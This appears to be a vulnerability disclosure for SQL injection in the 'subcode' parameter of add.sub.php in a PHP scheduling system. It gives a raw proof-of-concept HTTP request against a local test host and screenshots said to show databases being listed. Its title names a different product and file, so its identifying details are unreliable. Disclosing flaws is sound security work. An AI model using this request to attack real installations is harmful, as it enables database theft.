# Responsive Blog Site has sql injection in single.php

## supplier 
https://code-projects.org/simple-scheduling-system-in-php-with-source-code/
## Vulnerability file
add.sub.php

## describe

**Code analysis**   

In the add.sub.php file of Responsive Blog Site, the subcode parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/4df13fa0-5e56-48ff-9f29-c721c6476851.png)


## POC

```
POST /sche/schedulingsystem/add.sub.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 49
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/sche/schedulingsystem/addsubject.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ndcsgs6flhkd0mjf99bi0qqcoh
Connection: close

subcode=123&subdescription=123&submit=Add+Subject

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/d8560537-b648-4864-a15f-a12445e60120.png)
Get databases
![image-2025](https://github.com/asd1238525/cve/blob/main/50400a97-d442-44de-8b44-56279248c4b6.png)